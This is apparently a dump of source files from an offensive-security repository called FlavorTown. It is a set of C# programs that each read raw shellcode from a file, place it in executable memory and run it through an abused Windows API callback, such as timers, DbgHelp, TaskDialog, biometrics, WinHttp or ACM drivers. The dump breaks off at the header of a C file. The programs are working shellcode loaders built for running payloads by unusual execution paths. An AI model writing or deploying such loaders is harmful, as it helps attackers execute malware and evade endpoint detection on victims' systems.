// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SetWaitableTimer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: SetWaitableTimer.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hTimer = CreateWaitableTimer(IntPtr.Zero, false, string.Empty);
            LARGE_INTEGER sLI = new LARGE_INTEGER();
            SetWaitableTimer(hTimer, ref sLI, 
                0, hAlloc, IntPtr.Zero, false);

            SleepEx(1000, true);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateWaitableTimer(
            IntPtr lpTimerAttributes,
            bool bManualReset,
            string lpTimerName);

        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public Int32 HighPart;
        }

        [DllImport("kernel32.dll")]
        static extern bool SetWaitableTimer(IntPtr hTimer,
            ref LARGE_INTEGER pDueTime,
            int lPeriod,
            IntPtr pfnCompletionRoutine,
            IntPtr lpArgToCompletionRoutine,
            bool fResume);

        [DllImport("kernel32.dll")]
        static extern int SleepEx(
             UInt32 dwMilliseconds,
             bool bAlertable);
    }
}

```

`C#/StackWalk.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace StackWalk
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: StackWalk.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);


            uint IMAGE_FILE_MACHINE_AMD64 = 0x8664;
            STACKFRAME sStackFrame = new STACKFRAME();
            CONTEXT64 sContext = new CONTEXT64();

            StackWalk(IMAGE_FILE_MACHINE_AMD64, Process.GetCurrentProcess().Handle, IntPtr.Zero, ref sStackFrame, ref sContext, IntPtr.Zero, hAlloc, IntPtr.Zero, IntPtr.Zero);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("DbgHelp.dll")]
        static extern bool StackWalk(
            uint MachineType,
            IntPtr hProcess,
            IntPtr hThread,
            ref STACKFRAME StackFrame,
            ref CONTEXT64 ContextRecord,
            IntPtr ReadMemoryRoutine,
            IntPtr FunctionTableAccessRoutine,
            IntPtr GetModuleBaseRoutine,
            IntPtr TranslateAddress);

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        // Next x64

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public struct STACKFRAME
        {
            public IntPtr AddrPC;
            public IntPtr AddrReturn;
            public IntPtr AddrFrame;
            public IntPtr AddrStack;
            public IntPtr FuncTableEntry;
            public uint Params;
            public bool Far;
            public bool Virtual;
            public uint Reserved;
            public IntPtr KDHELP64;
            public IntPtr AddrBStore;
        }
    }
}

```

`C#/SymRegisterCallback.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SymRegisterCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: SymRegisterCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hProcess = Process.GetCurrentProcess().Handle;
            SymInitialize(hProcess, String.Empty, false);
            SymRegisterCallback(hProcess, hAlloc, IntPtr.Zero);
            SymRefreshModuleList(hProcess);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("DbgHelp.dll")]
        static extern bool SymInitialize(
            IntPtr hProcess,
            string UserSearchPath,
            bool fInvadeProcess);

        [DllImport("DbgHelp.dll")]
        static extern bool SymRegisterCallback(
            IntPtr hProcess,
            IntPtr hCallback,
            IntPtr UserContext);

        [DllImport("DbgHelp.dll")]
        static extern bool SymRefreshModuleList(IntPtr hProcess);
    }
}

```

`C#/TaskDialogIndirect.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 only
// Usage: this.exe <shellcode file>

//Steps for use:
// 1. Add/Uncomment these lines from the app.manifest:
/*
    < dependentAssembly >
      < assemblyIdentity
      type = "win32"
      name = "Microsoft.Windows.Common-Controls"
      version = "6.0.0.0"
      processorArchitecture = "*"
      publicKeyToken = "6595b64144ccf1df"
      language = "*"
    />
    </ dependentAssembly >
*/
// For more information, see the Notes section of https://www.pinvoke.net/default.aspx/comctl32.taskdialogindirect

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TaskDialogIndirect
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: TaskDialogIndirect.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            TaskDialogConfig sTDC = new TaskDialogConfig();
            sTDC.cbSize = (uint)Marshal.SizeOf(typeof(TaskDialogConfig));
            sTDC.pfCallback = hAlloc;
            
            TaskDialogIndirect(ref sTDC, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comctl32.dll", ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern uint TaskDialogIndirect (
            [In] ref TaskDialogConfig pTaskConfig,
            IntPtr pnButton, //Optional
            IntPtr pnRadioButton, //Optional
            IntPtr pfverificationFlagChecked); //Optional

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto, Pack = 1)]
        public struct TaskDialogConfig
        {
            public uint cbSize;
            public IntPtr hwndParent;
            public IntPtr hInstance;
            public uint dwFlags;
            public uint dwCommonButtons;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszWindowTitle;
            public IntPtr hMainIcon;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszMainInstruction;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszContent;
            public uint cButtons;
            public IntPtr pButtons;
            public int nDefaultButton;
            public uint cRadioButtons;
            public IntPtr pRadioButtons;
            public int nDefaultRadioButton;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszVerificationText;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszExpandedInformation;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszExpandedControlText;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszCollapsedControlText;
            public IntPtr hFooterIcon;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszFooter;
            public IntPtr pfCallback;
            public IntPtr lpCallbackData;
            public uint cxWidth;
        }
    }
}

```

`C#/TrySubmitThreadpoolCallback.cs`:

```cs
// Wra7h/FlavorTown
// This one works for simple shellcode.
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TrySubmitThreadpoolCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: TrySubmitThreadpoolCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            TrySubmitThreadpoolCallback(hAlloc, IntPtr.Zero, IntPtr.Zero);

            System.Threading.Thread.Sleep(5000);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool TrySubmitThreadpoolCallback(IntPtr pfns, IntPtr pv, IntPtr pcbe);

    }
}

```

`C#/WinBioCaptureSampleWithCallback.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinBioCaptureSampleWithCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WinBioCaptureSampleWithCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hBioSession = IntPtr.Zero;
            uint WINBIO_TYPE_FINGERPRINT = 0x00000008;
            uint WINBIO_POOL_SYSTEM = 1;
            uint WINBIO_FLAG_DEFAULT = 0x00000000;
            uint WINBIO_DB_DEFAULT = 1;
            WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, IntPtr.Zero, 0, (IntPtr)WINBIO_DB_DEFAULT, out hBioSession);

            uint WINBIO_PURPOSE_VERIFY = 0x1;
            uint WINBIO_DATA_FLAG_PROCESSED = 0x80;
            WinBioCaptureSampleWithCallback(hBioSession, WINBIO_PURPOSE_VERIFY, WINBIO_DATA_FLAG_PROCESSED, hAlloc, IntPtr.Zero);

            WinBioWait(hBioSession);

            WinBioCloseSession(hBioSession);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioOpenSession(uint Factor,
            uint PoolType, uint Flags,
            IntPtr UnitArray, uint UnitCount,
            IntPtr DatabaseId, out IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioCaptureSampleWithCallback(IntPtr SessionHandle, 
            uint Purpose, uint Flags, IntPtr VerifyCallback, IntPtr VerifyCallbackContext);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioWait(IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioCloseSession(IntPtr SessionHandle);
    }
}

```

`C#/WinBioEnrollCaptureWithCallback.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinBioEnrollCaptureWithCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WinBioEnrollCaptureWithCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hBioSession = IntPtr.Zero;
            uint WINBIO_TYPE_FINGERPRINT = 0x00000008;
            uint WINBIO_POOL_SYSTEM = 1;
            uint WINBIO_FLAG_DEFAULT = 0x00000000;
            uint WINBIO_DB_DEFAULT = 1;
            WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, IntPtr.Zero, 0, (IntPtr)WINBIO_DB_DEFAULT, out hBioSession);

            WinBioEnrollCaptureWithCallback(hBioSession, hAlloc, IntPtr.Zero);

            WinBioWait(hBioSession);

            WinBioCloseSession(hBioSession);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioOpenSession(uint Factor,
            uint PoolType, uint Flags,
            IntPtr UnitArray, uint UnitCount,
            IntPtr DatabaseId, out IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioEnrollCaptureWithCallback(IntPtr SessionHandle, 
            IntPtr VerifyCallback, IntPtr VerifyCallbackContext);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioWait(IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioCloseSession(IntPtr SessionHandle);
    }
}

```

`C#/WinBioVerifyWithCallback.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinBioVerifyWithCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WinBioVerifyWithCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hBioSession = IntPtr.Zero;
            uint WINBIO_TYPE_FINGERPRINT = 0x00000008;
            uint WINBIO_POOL_SYSTEM = 1;
            uint WINBIO_FLAG_DEFAULT = 0x00000000;
            uint WINBIO_DB_DEFAULT = 1;
            WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, IntPtr.Zero, 0, (IntPtr)WINBIO_DB_DEFAULT, out hBioSession);

            uint WINBIO_ANSI_381_POS_UNKNOWN = 0x0;
            WINBIO_IDENTITY sWI = new WINBIO_IDENTITY();
            WinBioVerifyWithCallback(hBioSession,ref sWI, WINBIO_ANSI_381_POS_UNKNOWN, hAlloc, IntPtr.Zero);

            WinBioWait(hBioSession);

            WinBioCloseSession(hBioSession);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioOpenSession(uint Factor,
            uint PoolType, uint Flags,
            IntPtr UnitArray, uint UnitCount,
            IntPtr DatabaseId, out IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioVerifyWithCallback(IntPtr SessionHandle, 
            ref WINBIO_IDENTITY Identity, uint SubFactor,
            IntPtr VerifyCallback, IntPtr VerifyCallbackContext);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioWait(IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioCloseSession(IntPtr SessionHandle);

        [StructLayout(LayoutKind.Sequential, Size = 76)]
        struct WINBIO_IDENTITY
        {
            //Not really necessary for this.
        }
    }
}

```

`C#/WinHttpSetStatusCallback.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinHttpSetStatusCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WinHttpSetStatusCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            uint WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;
            string WINHTTP_NO_PROXY_NAME = null;
            string WINHTTP_NO_PROXY_BYPASS = null;

            IntPtr hSession = WinHttpOpen(null, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

            uint WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS = 0xFFFFFFFF;
            WinHttpSetStatusCallback(hSession, hAlloc, WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS, IntPtr.Zero);

            WinHttpConnect(hSession, "localhost", 80, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpOpen(
            string pszAgent,
            uint dwAccessType,
            string pszProxyW,
            string pszProxyBypass,
            uint dwFlags);

        [DllImport("Winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpSetStatusCallback(
            IntPtr hInternet,
            IntPtr lpfnInternetCallback,
            uint dwNotificationFlags,
            IntPtr dwReserved);

        [DllImport("winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpConnect(IntPtr hSession,
            string pswzServerName,
            short nServerPort,
            int dwReserved);

    }
}

```

`C#/WindowsInspectString.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WindowsInspectString
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WindowsInspectString.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            uint len = 0;
            IntPtr pStringAddr = IntPtr.Zero;
            WindowsInspectString("Wra7h", 0x8664, hAlloc, IntPtr.Zero, ref len, ref pStringAddr);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("ComBase.dll")]
        static extern long WindowsInspectString(
            string targetHString,
            ushort machine,
            IntPtr callback,
            IntPtr context,
            ref uint length,
            ref IntPtr targetStringAddress
            );


    }
}

```

`C#/acmDriverEnum.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace acmDriverEnum
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: acmDriverEnum.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            acmDriverEnum(hAlloc, 0, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Msacm32.dll")]
        public extern static void acmDriverEnum(IntPtr CallStateCallback, uint dwInstance, uint fdwEnum);

    }
}

```

`C/BindImageEx.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
